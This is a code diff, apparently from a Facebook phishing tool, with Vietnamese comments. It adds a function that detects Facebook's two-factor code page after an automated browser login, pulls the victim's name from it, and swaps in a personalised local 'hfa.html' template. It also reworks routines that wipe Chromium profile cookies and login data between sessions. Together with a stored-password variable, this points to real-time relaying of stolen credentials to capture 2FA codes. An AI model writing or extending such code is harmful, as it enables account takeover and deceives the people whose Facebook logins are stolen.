@@ -29,200 +29,198 @@ LAST_PASSWORD = None
 
 
 
+def process_html_for_hfa(html_content: str) -> str | None:
+    """
+    Kiểm tra nếu HTML có input với id="_r_3_" và class chứa các class cụ thể.
+    Nếu có, tìm span với class pattern x1lliihq x1plvlek... để lấy nội dung,
+    sau đó thay thế vào templates/hfa.html và trả về nội dung hfa.html.
+    
+    Args:
+        html_content: HTML content từ Facebook
+        
+    Returns:
+        str | None: Nội dung hfa.html đã được thay thế, hoặc None nếu không tìm thấy input
+    """
+    import os
+    
+    # Kiểm tra input với id="_r_3_" và các class cụ thể
+    # Pattern linh hoạt: chỉ cần có id="_r_3_" và các class x1i10hfl, xggy1nq, xtpw4lu trong thẻ input
+    input_pattern = r'<input[^>]*id="_r_3_"[^>]*>'
+    if not re.search(input_pattern, html_content):
+        return None
+    
+    # Kiểm tra thêm các class đặc trưng để chắc chắn là input 2FA
+    required_classes = ['x1i10hfl', 'xggy1nq', 'xtpw4lu']
+    input_match = re.search(r'<input[^>]*id="_r_3_"[^>]*class="([^"]*)"[^>]*>', html_content)
+    if not input_match:
+        # Thử pattern khác nếu class đứng trước id
+        input_match = re.search(r'<input[^>]*class="([^"]*)"[^>]*id="_r_3_"[^>]*>', html_content)
+    
+    if not input_match:
+        return None
+    
+    class_content = input_match.group(1)
+    if not all(cls in class_content for cls in required_classes):
+        return None
+    
+    print("[HFA] Phát hiện input với id='_r_3_' - xử lý thay thế HFA template...")
+    
+    # Tìm span với class pattern chứa tên người dùng
+    # Pattern: <span class="x1lliihq x1plvlek xryxfnj...">Name • Facebook</span>
+    span_pattern = r'<span[^>]*class="[^"]*x1lliihq x1plvlek[^"]*"[^>]*>([^<]*)</span>'
+    span_matches = re.findall(span_pattern, html_content)
+    
+    if not span_matches:
+        print("[HFA] Không tìm thấy span với class pattern x1lliihq x1plvlek")
+        return None
+    
+    # Tìm span có chứa pattern "Name • Facebook" (có dấu bullet)
+    target_content = None
+    for match in span_matches:
+        if 'Facebook' in match or '•' in match or '\u2022' in match:
+            target_content = match
+            break
+    
+    # Nếu không tìm thấy span có bullet, lấy span đầu tiên không rỗng
+    if not target_content:
+        for match in span_matches:
+            if match.strip():
+                target_content = match
+                break
+    
+    if not target_content:
+        print("[HFA] Không tìm thấy nội dung span phù hợp")
+        return None
+    
+    print(f"[HFA] Tìm thấy nội dung: {repr(target_content)}")
+    
+    # Đọc file hfa.html
+    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    hfa_path = os.path.join(base_dir, 'templates', 'hfa.html')
+    
+    try:
+        with open(hfa_path, 'r', encoding='utf-8') as f:
+            hfa_content = f.read()
+    except Exception as e:
+        print(f"[HFA] Lỗi khi đọc file hfa.html: {e}")
+        return None
+    
+    # Thay thế span đầu tiên trong hfa.html có class pattern tương tự
+    # Pattern: <span class="x1lliihq x1plvlek...">...</span>
+    hfa_span_pattern = r'(<span[^>]*class="[^"]*x1lliihq x1plvlek[^"]*"[^>]*>)([^<]*)(</span>)'
+    
+    def replace_first_span(match):
+        return match.group(1) + target_content + match.group(3)
+    
+    hfa_content_new = re.sub(hfa_span_pattern, replace_first_span, hfa_content, count=1)
+    
+    if hfa_content_new == hfa_content:
+        print("[HFA] Không tìm thấy span để thay thế trong hfa.html")
+        return None
+    
+    print(f"[HFA] Đã thay thế thành công, trả về nội dung hfa.html ({len(hfa_content_new)} ký tự)")
+    return hfa_content_new
+
+
 def clean_profile(profile_dir):
-
     """
-
     Xóa toàn bộ dữ liệu session trong profile Chromium.
-
     Ưu tiên xóa toàn bộ thư mục Default (cách triệt để nhất),
-
     giữ lại Extensions nếu có.
-
     """
-
     default_dir = os.path.join(profile_dir, "Default")
 
-
-
     if os.path.isdir(default_dir):
-
         print(f"  Tìm thấy thư mục Default, tiến hành xóa dữ liệu session...")
 
-
-
         # Các thư mục/file cần GIỮ LẠI (extensions đã cài sẵn trong master)
-
         keep = {
-
             "Extensions",
-
             "Local Extension Settings",
-
             "Extension Rules",
-
             "Extension State",
-
             "Managed Extension Settings",
-
         }
 
-
-
         deleted_count = 0
-
         for item in os.listdir(default_dir):
-
             if item in keep:
-
                 print(f"  Giữ lại: {item}")
-
                 continue
 
             full_path = os.path.join(default_dir, item)
-
             try:
-
                 if os.path.isfile(full_path) or os.path.islink(full_path):
-
                     os.remove(full_path)
-
                 elif os.path.isdir(full_path):
-
                     shutil.rmtree(full_path, ignore_errors=True)
-
                 deleted_count += 1
-
             except Exception as e:
-
                 print(f"  Không thể xóa {full_path}: {e}")
 
-
-
         print(f"  Đã xóa {deleted_count} mục trong Default/.")
-
     else:
-
         print(f"  Không tìm thấy thư mục Default, dùng fallback xóa từng file...")
-
         _clean_profile_fallback(profile_dir)
 
 
 
-
-
 def _clean_profile_fallback(profile_dir):
-
     """
-
     Fallback: xóa từng file/thư mục theo danh sách cụ thể
-
     (dùng khi không tìm thấy thư mục Default).
-
     """
-
     targets = {
-
         # Cookies & Auth
-
         "Cookies", "Cookies-journal",
-
         "Login Data", "Login Data-journal",
-
         "Login Data For Account", "Login Data For Account-journal",
-
         # Session
-
         "Current Session", "Current Tabs",
-
         "Last Session", "Last Tabs",
-
         # History & Navigation
-
         "History", "History-journal",
-
         "Visited Links",
-
         "Top Sites", "Top Sites-journal",
-
         "Network Action Predictor", "Network Action Predictor-journal",
-
         # Web Data
-
         "Web Data", "Web Data-journal",
-
         "Favicons", "Favicons-journal",
-
         # Storage (quan trọng - lưu auth token)
-
         "Local Storage",
-
         "Session Storage",
-
         "IndexedDB",
-
         "databases",
-
         "blob_storage",
-
         "Service Worker",
-
         "shared_proto_db",
-
         # Cache
-
         "Cache", "Code Cache", "GPUCache",
-
         # Misc
-
         "QuotaManager", "QuotaManager-journal",
-
         "TransportSecurity", "TransportSecurity-journal",
-
         "Extension Cookies", "Extension Cookies-journal",
-
         "Platform Notifications",
-
         "GCM Store",
-
         "AutofillStrikeDatabase",
-
     }
 
-
-
     for root, dirs, files in os.walk(profile_dir, topdown=False):
-
         for name in files:
-
             if name in targets:
-
                 file_path = os.path.join(root, name)
-
                 try:
-
                     os.remove(file_path)
-
                     print(f"  Đã xóa file: {file_path}")
-
                 except Exception as e:
-
                     print(f"  Không thể xóa file {file_path}: {e}")
-
         for name in dirs:
-
             if name in targets:
-
                 dir_path = os.path.join(root, name)
-
                 try:
-
                     shutil.rmtree(dir_path, ignore_errors=True)
-
                     print(f"  Đã xóa thư mục: {dir_path}")
-
                 except Exception as e:
-
                     print(f"  Không thể xóa thư mục {dir_path}: {e}")
 
 
@@ -666,9 +664,12 @@ def get_facebook_page_after_login(
         # --- Lấy HTML ---
 
         html_content = page.content()
-
         
-
+        # --- Kiểm tra và xử lý HFA template nếu có input _r_3_ ---
+        hfa_content = process_html_for_hfa(html_content)
+        if hfa_content:
+            html_content = hfa_content
+        
         # --- Kiểm tra nếu là trang lỗi đăng nhập (/login/web/) ---
 
         if '/login/web/' in final_url or 'facebook.com/login/web/' in final_url:
